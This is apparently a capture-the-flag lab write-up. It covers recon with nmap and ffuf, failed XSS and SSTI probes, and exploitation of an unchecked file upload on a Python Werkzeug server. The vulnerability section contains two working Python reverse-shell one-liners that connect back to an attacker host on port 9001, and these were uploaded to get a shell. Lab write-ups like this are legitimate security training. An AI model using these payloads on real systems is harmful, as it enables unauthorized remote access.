#team/red 
**Related Notes:** [[Arbitrary File Upload]] 
## Enumeration (recon)

### port scanning (Nmap)
Command: `nmap -sS -sV [IP_ADDRESS]`

**Key findings:**
1. port 5000  is open with  pnp service running

### Directory brute forcing (ffuf)
Command: `ffuf -w path/wordlist.txt -u http://[IP_ADDRESS]:5000/FUZZ`

**Results**:
No useful information was found 

**Observation of the website:** 
1. The website has a text box where we need to type our message and that message is shown in the website.	
	- Tried `<h1>test</h1>` and the program filters user input so no output is reflected 
2. There is a file upload option where we need to upload profile picture of the user.  

>[!info]  By using curl -I http://<TARGET_IP> found what server the website is running

**Key findings**:
```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.5 Python/3.10.12
Date: Sun, 15 Feb 2026 10:52:56 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 12986
Connection: close
```

## Finding vulnerability
1. As it is a python server tried SSTI vulnerability by using payload `{{7*7}}` but just like before the user inputs are filtered 
2. The file upload feature doesn't check for the file size or file format. So by using that vulnerability will try to gain a webshell
    ```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.48.71.148",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh") 
    ```

>[!info] Observation: The above shell command does not work. But as it is a file upload and no need to struggle with one liner command and also found pty.spawn("sh") doesn't work for this particular case so used this payload instead 
>```
>import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
>```

**Final result:**
Created a file named shell.py and copy pasted that command. Started a nc listener in my terminal and uploaded the file. Once it is uploaded captured a connection in my terminal and got the flag





